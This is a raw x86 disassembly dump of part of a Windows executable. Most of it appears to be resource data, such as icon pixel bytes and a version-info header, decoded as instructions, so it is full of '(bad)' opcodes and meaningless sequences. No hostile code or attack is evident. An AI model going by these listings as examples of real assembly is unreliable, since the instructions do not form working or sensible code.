  41584f:	inc    esp
  415851:	scas   al,BYTE PTR es:[edi]
  415852:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415853:	(bad)  
  415854:	(bad)  
  415856:	fdivp  st(7),st
  415858:	mov    esi,0xbdffbabb
  41585d:	mov    eax,ds:0xd8ffff96
  415862:	enter  0xffff,0xd9
  415866:	leave  
  415867:	(bad)  
  415868:	(bad)  
  415869:	fcmovne st,st(6)
  41586b:	(bad)  
  41586c:	(bad)  
  41586d:	fadd   st,st(3)
  41586f:	(bad)  
  415870:	stc    
  415871:	ret    0xffa9
  415874:	retf   
  415875:	xlat   BYTE PTR ds:[ebx]
  415876:	(bad)  
  415878:	xchg   ebx,eax
  415879:	xchg   esi,eax
  41587a:	xchg   edi,eax
  41587b:	not    BYTE PTR [esi+0x189596]
  415881:	add    BYTE PTR [eax],al
  415883:	add    BYTE PTR [esi+0x7a9e8d8b],cl
  415889:	je     0x415902
  41588b:	jmp    FWORD PTR [ebp-0xa005354]
  415891:	idiv   cl
  415893:	(bad)  
  415894:	(bad)  
  415895:	(bad)  
  415896:	(bad)  
  415897:	jmp    ecx
  415899:	loope  0x41587c
  41589b:	call   edi
  41589d:	xlat   BYTE PTR ds:[ebx]
  41589e:	xlat   BYTE PTR ds:[ebx]
  41589f:	inc    ecx
  4158a1:	rcl    bh,cl
  4158a3:	call   FWORD PTR [ebx-0x5e00aca8]
  4158a9:	sub    BYTE PTR [ecx],bl
  4158ab:	call   FWORD PTR [edi-0x5000fffc]
  4158b1:	pop    ss
  4158b2:	add    bh,bh
  4158b4:	mov    ebx,0xc7ff001a
  4158b9:	sbb    eax,0x20d3ff00
  4158be:	add    bh,bh
  4158c0:	fbld   TBYTE PTR [esi]
  4158c2:	add    bh,bh
  4158c4:	jmp    0x4158cf
  4158c6:	add    bh,bh
  4158c8:	sti    
  4158c9:	ja     0x415928
  4158cb:	(bad)  
  4158cc:	push   ecx
  4158ce:	out    dx,eax
  4158cf:	(bad)  
  4158d0:	clc    
  4158d1:	aad    0xc8
  4158d3:	inc    eax
  4158d5:	mov    bl,0xaf
  4158d7:	call   esp
  4158d9:	aam    0xd4
  4158db:	jmp    DWORD PTR [edi-0x36005e5d]
  4158e1:	mov    bl,0xa8
  4158e3:	(bad)  
  4158e4:	cld    
  4158e5:	(bad)  
  4158e7:	(bad)  
  4158e8:	jmp    esp
  4158ea:	(bad)  
  4158ec:	jmp    ebx
  4158ee:	aad    0xff
  4158f0:	dec    edx
  4158f2:	mov    bl,0xff
  4158f4:	fcmovu st,st(6)
  4158f6:	fdivp  st(7),st
  4158f8:	fwait
  4158f9:	popf   
  4158fa:	mov    al,ds:0x909293ff
  4158ff:	and    DWORD PTR [eax],eax
  415901:	add    BYTE PTR [eax],al
  415903:	add    BYTE PTR [ecx-0x4ef66667],bl
  415909:	mov    ah,0xb2
  41590b:	push   ecx
  41590c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41590d:	test   al,0xa9
  41590f:	mov    eax,0xffb7b7b6
  415914:	fcomp  st(0)
  415916:	fdivr  st,st(7)
  415918:	cld    
  415919:	cld    
  41591a:	cld    
  41591b:	(bad)  
  41591c:	(bad)  
  41591d:	(bad)  
  41591e:	(bad)  
  41591f:	call   eax
  415921:	fsubrp st(3),st
  415923:	call   FWORD PTR [ebx+ebx*2+0x8cff53]
  41592a:	add    bh,bh
  41592c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41592d:	adc    BYTE PTR [eax],al
  41592f:	push   DWORD PTR [edx-0x4000ffe9]
  415935:	sbb    eax,DWORD PTR [eax]
  415937:	dec    ebx
  415939:	push   ds
  41593a:	add    bh,bh
  41593c:	xlat   BYTE PTR ds:[ebx]
  41593d:	and    al,0x0
  41593f:	jmp    ebx
  415941:	and    BYTE PTR [eax],al
  415943:	push   eax
  415945:	push   cs
  415946:	add    bh,bh
  415948:	push   DWORD PTR [eax-0x7000063]
  41594e:	idiv   bh
  415950:	(bad)  
  415951:	(bad)  
  415953:	push   eax
  415955:	xlat   BYTE PTR ds:[ebx]
  415956:	iret   
  415957:	push   DWORD PTR [ebx-0x42005554]
  41595d:	mov    ebp,0xa3adffbd
  415962:	lahf   
  415963:	(bad)  
  415964:	stc    
  415965:	out    0xe2,eax
  415967:	(bad)  
  415968:	push   edx
  41596a:	in     al,dx
  41596b:	(bad)  
  41596c:	push   ebx
  41596e:	out    dx,al
  41596f:	(bad)  
  415970:	(bad)  
  415971:	fadd   st,st(6)
  415973:	(bad)  
  415974:	jmp    0xa7413e5e
  415979:	lods   al,BYTE PTR ds:[esi]
  41597a:	scas   al,BYTE PTR es:[edi]
  41597b:	call   DWORD PTR [eax+0x2c8f90]
	...
  415989:	add    BYTE PTR [eax],al
  41598b:	add    BYTE PTR [esi+eiz*4-0x5f60fa5a],ah
  415992:	mov    al,ds:0x91919017
  415997:	bound  ebx,QWORD PTR [ecx-0x4c476566]
  41599d:	mov    ah,0xb4
  41599f:	repz ret 
  4159a1:	iret   
  4159a2:	sar    bh,cl
  4159a4:	sahf   
  4159a5:	jb     0x415a14
  4159a7:	dec    DWORD PTR [ebp-0x57010000]
  4159ad:	adc    eax,DWORD PTR [eax]
  4159af:	push   DWORD PTR [ebp-0x3e00ffe4]
  4159b5:	push   ds
  4159b6:	add    bh,bh
  4159b8:	iret   
  4159b9:	and    BYTE PTR [eax],al
  4159bb:	(bad)  
  4159bc:	(bad)  [esi]
  4159be:	add    bh,bh
  4159c0:	out    0x18,al
  4159c2:	add    bh,bh
  4159c4:	clc    
  4159c5:	and    al,0x0
  4159c7:	(bad)  
  4159c8:	jmp    edx
  4159ca:	xlat   BYTE PTR ds:[ebx]
  4159cb:	(bad)  
  4159cc:	(bad)  
  4159cd:	(bad)  
  4159ce:	(bad)  
  4159cf:	(bad)  
  4159d0:	(bad)  
  4159d1:	in     eax,dx
  4159d2:	jmp    0xec3259d6
  4159d7:	(bad)  
  4159d8:	out    dx,al
  4159d9:	loop   0x4159b5
  4159db:	(bad)  
  4159dc:	jmp    0xed4130bf
  4159e1:	fcmovnbe st,st(2)
  4159e3:	(bad)  
  4159e4:	std    
  4159e5:	out    0xdb,al
  4159e7:	(bad)  
  4159e8:	jmp    ebp
  4159ea:	aad    0xff
  4159ec:	(bad)  
  4159ed:	fmul   st(1),st
  4159ef:	(bad)  
  4159f0:	sti    
  4159f1:	mov    ebx,0xe9f3ff9e
  4159f6:	in     al,0xff
  4159f8:	mov    cl,0xba
  4159fa:	mov    esp,0x8a8b8dff
  4159ff:	push   eax
	...
  415a1c:	xchg   esi,eax
  415a1d:	xchg   esi,eax
  415a1e:	xchg   esi,eax
  415a1f:	or     al,0xae
  415a21:	mov    dh,0xb9
  415a23:	lods   al,BYTE PTR ds:[esi]
  415a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a25:	popf   
  415a26:	pushf  
  415a27:	call   DWORD PTR [ecx-0x5200fdfb]
  415a2d:	or     BYTE PTR [eax],al
  415a2f:	(bad)  
  415a30:	mov    edx,0xc6ff000d
  415a35:	or     al,BYTE PTR [eax]
  415a37:	call   esp
  415a39:	or     al,BYTE PTR [eax]
  415a3b:	jmp    ebx
  415a3d:	or     BYTE PTR [eax],al
  415a3f:	(bad)  
  415a40:	out    dx,eax
  415a41:	add    BYTE PTR [eax],al
  415a43:	(bad)  
  415a44:	jmp    FWORD PTR [ebx]
  415a46:	add    bh,bh
  415a48:	(bad)  
  415a49:	fcmovnbe st,st(0)
  415a4b:	(bad)  
  415a4c:	std    
  415a4d:	fxch   st(7)
  415a4f:	(bad)  
  415a50:	inc    esi
  415a52:	mov    ch,0xff
  415a54:	cli    
  415a55:	les    esi,FWORD PTR [ecx-0x4f3d0b01]
  415a5b:	(bad)  
  415a5c:	clc    
  415a5d:	shr    DWORD PTR [edi-0x5b440b01],0xff
  415a64:	out    0xb4,al
  415a66:	mov    eax,ds:0xacbae0ff
  415a6b:	jmp    ebx
  415a6d:	lds    edi,FWORD PTR [ecx-0x3b331c01]
  415a73:	push   ebp
  415a75:	div    ch
  415a77:	inc    esp
  415a79:	(bad)  
  415a7a:	leave  
  415a7b:	call   FWORD PTR [ebp+0x3b9b9c]
	...
  415a9d:	add    BYTE PTR [eax],al
  415a9f:	add    BYTE PTR [edx-0x4e924348],dh
  415aa5:	mov    edx,0x85ffbd
  415aaa:	add    bh,bh
  415aac:	mov    eax,ds:0xb3ff0000
  415ab1:	or     BYTE PTR [ebx],al
  415ab3:	(bad)  
  415ab4:	mov    eax,0xbfff0b16
  415ab9:	sub    al,0x1a
  415abb:	dec    esp
  415abd:	dec    eax
  415abe:	xor    edi,edi
  415ac0:	(bad)  
  415ac1:	push   edi
  415ac2:	inc    ebp
  415ac3:	call   ecx
  415ac5:	jl     0x415b32
  415ac7:	call   ebp
  415ac9:	scas   al,BYTE PTR es:[edi]
  415aca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415acb:	call   ecx
  415acd:	mov    dl,0xac
  415acf:	call   eax
  415ad1:	mov    ch,0xaf
  415ad3:	dec    eax
  415ad5:	mov    ebp,0xcac7ffbc
  415ada:	retf   0xcbff
  415add:	rcl    dl,1
  415adf:	dec    edx
  415ae1:	rcl    esp,1
  415ae3:	dec    ecx
  415ae5:	(bad)  
  415ae6:	fucompp 
  415ae8:	retf   
  415ae9:	fchs   
  415aeb:	int    0xc7
  415aed:	xlat   BYTE PTR ds:[ebx]
  415aee:	fsub   QWORD PTR [edx-0x70242937]
  415af4:	iret   
  415af5:	rcl    ebx,1
  415af7:	mov    ecx,edx
  415af9:	aam    0xd4
  415afb:	push   ecx
	...
  415b20:	mov    bl,0xb5
  415b22:	mov    ecx,0xc4bfb664
  415b27:	call   FWORD PTR [edi-0x5200908d]
  415b2d:	xchg   ecx,eax
  415b2e:	(bad)  
  415b2f:	(bad)  
  415b30:	mov    edx,0xb8ffabad
  415b35:	mov    ebx,0xceb8ffb8
  415b3a:	iret   
  415b3b:	(bad)  
  415b3c:	mov    esp,0xc1ffe5e0
  415b41:	in     eax,dx
  415b42:	repz test eax,0xc4dfefe7
  415b49:	xlat   BYTE PTR ds:[ebx]
  415b4a:	fidivr DWORD PTR [edi-0x5f252a3c]
  415b50:	(bad)
  415b53:	test   eax,ecx
  415b55:	rcl    ebp,1
  415b57:	jae    0x415b21
  415b59:	int    0xce
  415b5b:	push   esp
  415b5c:	(bad)  
  415b5d:	retf   
  415b5e:	int3   
  415b5f:	aas    
  415b60:	(bad)  
  415b61:	int3   
  415b62:	int    0x39
  415b64:	enter  0xcdca,0x25
  415b68:	(bad)  
  415b69:	leave  
  415b6a:	enter  0xc61d,0xc8
  415b6e:	leave  
  415b6f:	shufps xmm1,xmm0,0xc9
  415b73:	or     eax,0x4c9c8c3
  415b78:	(bad)  
  415b79:	leave  
  415b7a:	retf   
  415b7b:	push   es
  415b7c:	retf   
  415b7d:	iret   
  415b7e:	rol    BYTE PTR [edx],cl
	...
  415ba0:	call   0xbdbc:0xba0c9c99
  415ba7:	mov    ds:0xbee8e6ce,eax
  415bac:	enter  0xe3e1,0x96
  415bb0:	leave  
  415bb1:	fstp   st(7)
  415bb3:	imul   ecx,edx,0xffffffdd
  415bb6:	loope  0x415c07
  415bb8:	retf   
  415bb9:	xlat   BYTE PTR ds:[ebx]
  415bba:	fidivr DWORD PTR [eax]
  415bbc:	retf   0xd2d1
  415bbf:	cs enter 0xcccd,0x1e
  415bc4:	enter  0xcac9,0xe
	...
  415d00:	(bad)  
  415d01:	(bad)  
  415d02:	(bad)  
  415d03:	(bad)  
  415d04:	(bad)  
  415d05:	(bad)  
  415d06:	(bad)  
  415d07:	(bad)  
  415d08:	(bad)  
  415d09:	inc    BYTE PTR [eax]
  415d0b:	(bad)  
  415d0c:	(bad)  
  415d0d:	cld    
  415d0e:	add    BYTE PTR [ebx-0x1],dh
  415d11:	lock add BYTE PTR [ecx],al
  415d14:	push   eax
  415d16:	add    BYTE PTR [eax],al
  415d18:	jmp    eax
  415d1a:	add    BYTE PTR [eax],al
  415d1c:	push   eax
  415d1e:	add    BYTE PTR [eax],al
  415d20:	cmp    BYTE PTR [eax],0x0
  415d23:	add    al,BYTE PTR [eax-0x7ffcfff4]
  415d29:	add    al,BYTE PTR [eax]
  415d2b:	add    eax,DWORD PTR [eax-0x7ffd0000]
  415d31:	add    BYTE PTR [eax],al
  415d33:	add    eax,DWORD PTR [eax-0x7ffd0000]
  415d39:	add    BYTE PTR [eax],al
  415d3b:	add    DWORD PTR [eax-0x7fff0000],eax
  415d41:	add    BYTE PTR [eax],al
  415d43:	add    DWORD PTR [eax-0x7fff0000],eax
  415d49:	add    BYTE PTR [eax],al
  415d4b:	add    DWORD PTR [eax-0x7fff0000],eax
  415d51:	add    BYTE PTR [eax],al
  415d53:	add    DWORD PTR [eax-0x80000000],eax
  415d59:	add    BYTE PTR [eax],al
  415d5b:	add    BYTE PTR [eax-0x80000000],al
  415d61:	add    BYTE PTR [eax],al
  415d63:	add    al,ah
  415d65:	add    BYTE PTR [eax],al
  415d67:	add    dh,bh
  415d69:	add    BYTE PTR [eax],al
  415d6b:	add    bh,bh
  415d6d:	add    BYTE PTR [eax],al
  415d6f:	add    edi,edi
  415d71:	add    BYTE PTR [eax],al
  415d73:	add    bh,bh
  415d75:	add    BYTE PTR [edi],bh
  415d77:	(bad)  
  415d78:	(bad)  
  415d79:	(bad)  
  415d7a:	(bad)  
  415d7b:	(bad)  
  415d7c:	(bad)  
  415d7d:	(bad)  
  415d7e:	(bad)  
  415d7f:	jmp    FWORD PTR [eax]
  415d81:	add    BYTE PTR [eax],al
  415d83:	add    BYTE PTR [eax],dl
  415d85:	add    BYTE PTR [eax],al
  415d87:	add    BYTE PTR [eax],ah
  415d89:	add    BYTE PTR [eax],al
  415d8b:	add    BYTE PTR [ecx],al
  415d8d:	add    BYTE PTR [eax],ah
  415d8f:	add    BYTE PTR [eax],al
  415d91:	add    BYTE PTR [eax],al
  415d93:	add    BYTE PTR [eax+0x4],al
	...
  415de6:	add    BYTE PTR [eax],al
  415de8:	xchg   ecx,eax
  415de9:	nop
  415dea:	nop
  415deb:	(bad)  
  415dec:	jnp    0x415e67
  415dee:	jns    0x415def
  415df0:	xchg   ecx,eax
  415df1:	nop
  415df2:	nop
  415df3:	inc    DWORD PTR [eax]
	...
  415dfd:	add    BYTE PTR [eax],al
  415dff:	add    BYTE PTR [ebx-0x44004344],bh
  415e05:	mov    esp,0xb5b4ffbc
  415e0a:	mov    ch,0xff
  415e0c:	fwait
  415e0d:	pushf  
  415e0e:	pushf  
  415e0f:	call   FWORD PTR [ebx-0x60006364]
  415e15:	mov    al,ds:0xa0a0ffa0
  415e1a:	mov    al,ds:0xff
	...
  415e27:	add    BYTE PTR [esp+esi*4-0x6b6b2c4c],dh
  415e2e:	xchg   esp,eax
  415e2f:	call   FWORD PTR [esi+0xcd9e9e]
	...
  415e3d:	add    BYTE PTR [eax],al
  415e3f:	add    dl,dl
  415e41:	rcl    dl,cl
  415e43:	or     al,0xc9
  415e46:	leave  
  415e47:	inc    esp
  415e49:	mov    dh,0xff
  415e4c:	mov    ecx,0xaaffbaba
  415e51:	stos   DWORD PTR es:[edi],eax
  415e52:	stos   DWORD PTR es:[edi],eax
  415e53:	jmp    DWORD PTR [eax-0x5f005f60]
  415e59:	mov    al,ds:0x61a0
	...
  415e66:	add    BYTE PTR [eax],al
  415e68:	stos   DWORD PTR es:[edi],eax
  415e69:	stos   DWORD PTR es:[edi],eax
  415e6a:	stos   DWORD PTR es:[edi],eax
  415e6b:	idiv   DWORD PTR [edi-0x5a004041]
  415e71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e73:	inc    DWORD PTR [eax]
	...
  415e81:	add    BYTE PTR [eax],al
  415e83:	add    dh,bl
  415e85:	(bad)  
  415e87:	ss mov ecx,0x8affbaba
  415e8d:	mov    cl,BYTE PTR [edx-0x68686801]
  415e93:	in     al,dx
  415e94:	mov    al,ds:0x36a0a0
	...
  415ea5:	add    BYTE PTR [eax],al
  415ea7:	add    BYTE PTR [esi-0x2e085152],ch
  415ead:	rcl    ecx,1
  415eaf:	jmp    FWORD PTR [ebx-0x3c005455]
  415eb5:	(bad)  
  415eb6:	les    eax,FWORD PTR [esi-0x3e3e40]
  415ebc:	mov    esi,0xbbffbfbf
  415ec1:	mov    esp,0xb9b8ffbc
  415ec6:	mov    ecx,0xb6b6b5ff
  415ecb:	jmp    FWORD PTR [edx-0x57005556]
  415ed1:	test   al,0xa8
  415ed3:	jmp    DWORD PTR [esi-0x5b00595a]
  415ed9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415eda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415edb:	jmp    DWORD PTR [edx-0x5f005d5e]
  415ee1:	mov    al,ds:0xa0a0ffa0
  415ee6:	mov    al,ds:0xadadad95
  415eeb:	not    ecx
  415eed:	rcl    ecx,1
  415eef:	jmp    FWORD PTR [ebx-0x32005455]
  415ef5:	iret   
  415ef6:	iret   
  415ef7:	dec    ebp
  415ef9:	iret   
  415efa:	iret   
  415efb:	dec    ebp
  415efd:	into   
  415efe:	iret   
  415eff:	dec    esp
  415f01:	into   
  415f02:	into   
  415f03:	dec    ebx
  415f05:	int    0xcd
  415f07:	dec    edx
  415f09:	int3   
  415f0a:	int3   
  415f0b:	inc    edi
  415f0d:	leave  
  415f0e:	leave  
  415f0f:	inc    esi
  415f11:	leave  
  415f12:	leave  
  415f13:	inc    esi
  415f15:	leave  
  415f16:	leave  
  415f17:	inc    ebp
  415f19:	enter  0xffc8,0xc5
  415f1d:	enter  0xffc8,0xc4
  415f21:	mov    edi,0xa0a0a0ff
  415f27:	jmp    FWORD PTR [ebp-0x2e085253]
  415f2d:	rcl    ecx,1
  415f2f:	jmp    FWORD PTR [ebx-0x31005455]
  415f35:	rcl    al,1
  415f37:	jmp    FWORD PTR [ebp-0x58005152]
  415f3d:	(bad)  
  415f3e:	ud0    ebp,DWORD PTR [ebx-0x5700f2ed]
  415f45:	push   cs
  415f46:	push   cs
  415f47:	jmp    FWORD PTR [ecx-0x4b00dfe0]
  415f4d:	aas    
  415f4e:	das    
  415f4f:	call   esp
  415f51:	sbb    eax,DWORD PTR [ecx]
  415f53:	call   esp
  415f55:	sbb    eax,0x1dd8ff01
  415f5a:	add    bh,bh
  415f5c:	retf   
  415f5d:	and    eax,0xc8c5ff03
  415f62:	enter  0xa1ff,0xa1
  415f66:	mov    eax,ds:0xaeaeaeff
  415f6b:	not    ecx
  415f6d:	rcl    ecx,1
  415f6f:	jmp    FWORD PTR [esp+ebp*4-0x2e300054]
  415f76:	sar    edi,1
  415f78:	stos   DWORD PTR es:[edi],eax
  415f79:	lods   al,BYTE PTR ds:[esi]
  415f7a:	lods   al,BYTE PTR ds:[esi]
  415f7b:	push   DWORD PTR [edx-0x4c00dcd4]
  415f81:	xor    DWORD PTR [edx],esp
  415f83:	(bad)  
  415f84:	mov    ecx,0xc9ff0c1d
  415f89:	(bad)
  415f8c:	int3   
  415f8d:	jno    0x415ff2
  415f8f:	call   edi
  415f91:	inc    edi
  415f92:	sub    al,0xff
  415f94:	fiadd  WORD PTR [eax+0x25]
  415f97:	jmp    ebx
  415f99:	inc    esp
  415f9a:	daa    
  415f9b:	(bad)  
  415f9c:	fnstsw WORD PTR [ebx]
  415f9e:	adc    bh,bh
  415fa0:	(bad)  
  415fa1:	mov    edi,0xa3a3a3ff
  415fa7:	call   DWORD PTR [esi+0xf7a3bd]
  415fad:	repnz dec eax
  415faf:	jmp    DWORD PTR [edx-0x3e]
  415fb2:	cmp    bh,0xcf
  415fb5:	rcl    ecx,1
  415fb7:	jmp    FWORD PTR [ecx-0x4b005657]
  415fbd:	inc    eax
  415fbe:	xor    eax,0x222fb4ff
  415fc3:	call   edi
  415fc5:	(bad)  
  415fc6:	aad    0xff
  415fc8:	out    dx,al
  415fc9:	out    dx,al
  415fca:	out    dx,al
  415fcb:	(bad)  
  415fcc:	clc    
  415fcd:	clc    
  415fce:	clc    
  415fcf:	push   DWORD PTR [ebx-0x24007873]
  415fd5:	pop    eax
  415fd6:	cmp    edi,edi
  415fd8:	fstp   QWORD PTR [ecx+eax*2-0x1]
  415fdc:	fimul  WORD PTR [edi+0x2d]
  415fdf:	inc    ebp
  415fe1:	enter  0xffc8,0xa5
  415fe5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415fe7:	jmp    FWORD PTR [ebx+0x48f7abab]
  415fed:	inc    esp
  415fee:	inc    ebx
  415fef:	(bad)  
  415ff0:	jnp    0x41606b
  415ff2:	jns    0x415ff3
  415ff4:	rcl    edx,1
  415ff6:	sar    bh,cl
  415ff8:	mov    ds:0xb8ffa3a3,eax
  415ffd:	inc    ebx
  415ffe:	cmp    bh,bh
  416000:	rol    BYTE PTR [ecx+0x34],0xff
  416004:	fmul   st(2),st
  416006:	leave  
  416007:	(bad)  
  416008:	fcomp  DWORD PTR [edx]
  41600a:	add    bh,bh
  41600c:	aam    0x82
  41600e:	jne    0x41600f
  416010:	(bad)  
  416011:	(bad)  
  416012:	(bad)  
  416013:	call   esi
  416015:	push   0x53
  416017:	call   ebp
  416019:	ins    BYTE PTR es:[edi],dx
  41601a:	pop    ecx
  41601b:	(bad)  
  41601c:	fisub  DWORD PTR [edx+0x48]
  41601f:	inc    edi
  416021:	retf   0xffca
  416024:	stos   DWORD PTR es:[edi],eax
  416025:	stos   DWORD PTR es:[edi],eax
  416026:	stos   DWORD PTR es:[edi],eax
  416027:	(bad)  
  416028:	mov    esi,0xbe94bebe
  41602d:	mov    esi,0xbebeffbe
  416032:	mov    esi,0xd2d2d0c0
  416037:	jmp    DWORD PTR [edx-0x43005d5e]
  41603d:	das    
  41603e:	and    al,0xff
  416040:	lds    ebx,FWORD PTR [ecx+ecx*1]
  416043:	(bad)  
  416044:	ficomp DWORD PTR [esi]
  416046:	add    bh,bh
  416048:	out    0x1b,al
  41604a:	add    bh,bh
  41604c:	call   FWORD PTR [ecx+0x36]
  41604f:	push   ebx
  416051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416052:	nop
  416053:	(bad)  
  416054:	(bad)  
  416056:	fcos   
  416058:	jmp    FWORD PTR [edx+0x3c]
  41605b:	(bad)  
  41605c:	jmp    DWORD PTR [ebp+0x31]
  41605f:	inc    edi
  416061:	retf   0xffca
  416064:	lods   eax,DWORD PTR ds:[esi]
  416065:	scas   al,BYTE PTR es:[edi]
  416066:	scas   al,BYTE PTR es:[edi]
  416067:	inc    DWORD PTR [eax]
	...
  416071:	add    BYTE PTR [eax],al
  416073:	add    cl,dl
  416075:	rcl    bl,cl
  416077:	jmp    DWORD PTR [eax-0x3a005f60]
  41607d:	sbb    BYTE PTR [edi],al
  41607f:	call   esp
  416081:	sbb    BYTE PTR [ecx],al
  416083:	jmp    ebx
  416085:	es add bh,bh
  416088:	in     eax,dx
  416089:	sbb    al,BYTE PTR [eax]
  41608b:	(bad)  
  41608c:	push   DWORD PTR [eax+0x4b]
  41608f:	(bad)  
  416090:	jmp    FWORD PTR [ebx+0x48]
  416093:	jmp    ecx
  416095:	loope  0x416078
  416097:	inc    eax
  416099:	mov    edx,0x6bffffb8
  41609e:	aas    
  41609f:	dec    eax
  4160a1:	retf   0xffcb
  4160a4:	mov    al,0xb1
  4160a6:	mov    cl,0xff
	...
  4160b4:	rcl    edx,1
  4160b6:	sar    edi,cl
  4160b8:	mov    al,ds:0xcaffa0a0
  4160bd:	add    al,0x4
  4160bf:	(bad)  
  4160c0:	fmul   QWORD PTR [edi]
  4160c2:	add    bh,bh
  4160c4:	call   0xf84060db
  4160c9:	push   ss
  4160ca:	add    bh,bh
  4160cc:	(bad)  
  4160cd:	jg     0x41610b
  4160cf:	call   esi
  4160d1:	sbb    BYTE PTR [edi+edi*8-0x29],0x83
  4160d6:	pop    ecx
  4160d7:	(bad)  
  4160d8:	fiadd  DWORD PTR [ecx+0x73dfff51]
  4160de:	inc    ebx
  4160df:	dec    ecx
  4160e1:	retf   
  4160e2:	retf   
  4160e3:	push   DWORD PTR [edx+0xffb3b3]
	...
  4160f1:	add    BYTE PTR [eax],al
  4160f3:	add    cl,dl
  4160f5:	rcl    bl,cl
  4160f7:	jmp    DWORD PTR [eax-0x5f005f60]
  4160fd:	mov    al,ds:0xa0a0ffa0
  416102:	mov    al,ds:0xa2a2a2ff
  416107:	jmp    DWORD PTR [esp+eiz*4-0x5152005c]
  41610e:	scas   al,BYTE PTR es:[edi]
  41610f:	push   DWORD PTR [eax-0x4d004f50]
  416115:	mov    bl,0xb3
  416117:	push   DWORD PTR [ebp-0x4700494a]
  41611d:	mov    ecx,0xcbc9ffb9
  416122:	int3   
  416123:	push   DWORD PTR [ebp+0xffb6b6]
	...
  416131:	add    BYTE PTR [eax],al
  416133:	add    cl,dl
  416135:	rcl    bl,cl
  416137:	js     0x41610a
  416139:	rcl    bl,cl
  41613b:	call   ecx
  41613d:	rcl    bl,cl
  41613f:	call   ecx
  416141:	rcl    bl,cl
  416143:	call   eax
  416145:	rcl    dl,cl
  416147:	call   eax
  416149:	rcl    edx,1
  41614b:	dec    esi
  41614d:	rcl    al,1
  41614f:	dec    ebp
  416151:	iret   
  416152:	iret   
  416153:	dec    ebp
  416155:	iret   
  416156:	iret   
  416157:	dec    esp
  416159:	into   
  41615a:	into   
  41615b:	dec    ebx
  41615d:	int    0xcd
  41615f:	dec    edx
  416161:	int3   
  416162:	int3   
  416163:	(bad)  
  416164:	mov    eax,0x95b9b9
	...
  4161a5:	add    BYTE PTR [eax],al
  4161a7:	add    bh,bh
  4161a9:	inc    DWORD PTR [eax]
  4161ab:	add    BYTE PTR [edi+eax*1],bl
  4161ae:	add    BYTE PTR [eax],al
  4161b0:	sbb    al,0x7
  4161b2:	add    BYTE PTR [eax],al
  4161b4:	push   ds
  4161b5:	sldt   WORD PTR [eax]
	...
  4161d4:	loopne 0x4161d6
  4161d6:	add    BYTE PTR [eax],al
  4161d8:	loopne 0x4161da
  4161da:	add    BYTE PTR [eax],al
  4161dc:	loopne 0x4161de
  4161de:	add    BYTE PTR [eax],al
  4161e0:	loopne 0x4161e2
  4161e2:	add    BYTE PTR [eax],al
  4161e4:	(bad)  
  4161e5:	inc    DWORD PTR [eax]
  4161e7:	add    BYTE PTR [eax],al
  4161e9:	add    BYTE PTR [ecx],al
  4161eb:	add    BYTE PTR [edx],cl
  4161ed:	add    BYTE PTR [eax],dh
  4161ef:	xor    BYTE PTR [eax],dl
  4161f1:	add    BYTE PTR [ecx],al
  4161f3:	add    BYTE PTR [eax+eax*1],al
  4161f6:	push   0x1000006
  4161fb:	add    BYTE PTR [eax],ah
  4161fd:	and    BYTE PTR [eax],dl
  4161ff:	add    BYTE PTR [ecx],al
  416201:	add    BYTE PTR [eax+eax*1],al
  416204:	call   0x241620b
  416209:	add    BYTE PTR [eax],dl
  41620b:	adc    BYTE PTR [eax],dl
  41620d:	add    BYTE PTR [ecx],al
  41620f:	add    BYTE PTR [eax+eax*1],al
  416212:	sub    BYTE PTR [ecx],al
  416214:	add    BYTE PTR [eax],al
  416216:	add    eax,DWORD PTR [eax]
  416218:	xor    BYTE PTR [eax],dh
  41621a:	add    BYTE PTR [eax],al
  41621c:	add    DWORD PTR [eax],eax
  41621e:	or     BYTE PTR [eax],al
  416220:	test   al,0xe
  416222:	add    BYTE PTR [eax],al
  416224:	add    al,0x0
  416226:	and    BYTE PTR [eax],ah
  416228:	add    BYTE PTR [eax],al
  41622a:	add    DWORD PTR [eax],eax
  41622c:	or     BYTE PTR [eax],al
  41622e:	test   al,0x8
  416230:	add    BYTE PTR [eax],al
  416232:	add    eax,0x101000
  416237:	add    BYTE PTR [ecx],al
  416239:	add    BYTE PTR [eax],cl
  41623b:	add    BYTE PTR [eax+0x5],ch
  41623e:	add    BYTE PTR [eax],al
  416240:	push   es
  416241:	add    BYTE PTR [eax],al
  416243:	add    BYTE PTR [eax],al
  416245:	add    BYTE PTR [ecx],al
  416247:	add    BYTE PTR [eax],ah
  416249:	add    al,ch
  41624b:	mov    bh,0x0
  41624d:	add    BYTE PTR [edi],al
  41624f:	add    BYTE PTR [eax],dh
  416251:	xor    BYTE PTR [eax],al
  416253:	add    BYTE PTR [ecx],al
  416255:	add    BYTE PTR [eax],ah
  416257:	add    BYTE PTR [eax+0x8000025],ch
  41625d:	add    BYTE PTR [eax],ah
  41625f:	and    BYTE PTR [eax],al
  416261:	add    BYTE PTR [ecx],al
  416263:	add    BYTE PTR [eax],ah
  416265:	add    BYTE PTR [eax+0x9000010],ch
  41626b:	add    BYTE PTR [eax],dl
  41626d:	adc    BYTE PTR [eax],al
  41626f:	add    BYTE PTR [ecx],al
  416271:	add    BYTE PTR [eax],ah
  416273:	add    BYTE PTR [eax+0x4],ch
  416276:	add    BYTE PTR [eax],al
  416278:	or     al,BYTE PTR [eax]
  41627a:	add    BYTE PTR [eax],al
  41627c:	add    BYTE PTR [eax],al
  41627e:	add    BYTE PTR [eax],al
  416280:	clc    
  416281:	add    esi,DWORD PTR [eax+eax*1]
  416284:	add    BYTE PTR [eax],al
  416286:	push   esi
  416287:	add    BYTE PTR [ebx+0x0],dl
  41628a:	pop    edi
  41628b:	add    BYTE PTR [esi+0x0],dl
  41628e:	inc    ebp
  41628f:	add    BYTE PTR [edx+0x0],dl
  416292:	push   ebx
  416293:	add    BYTE PTR [ecx+0x0],cl
  416296:	dec    edi
  416297:	add    BYTE PTR [esi+0x0],cl
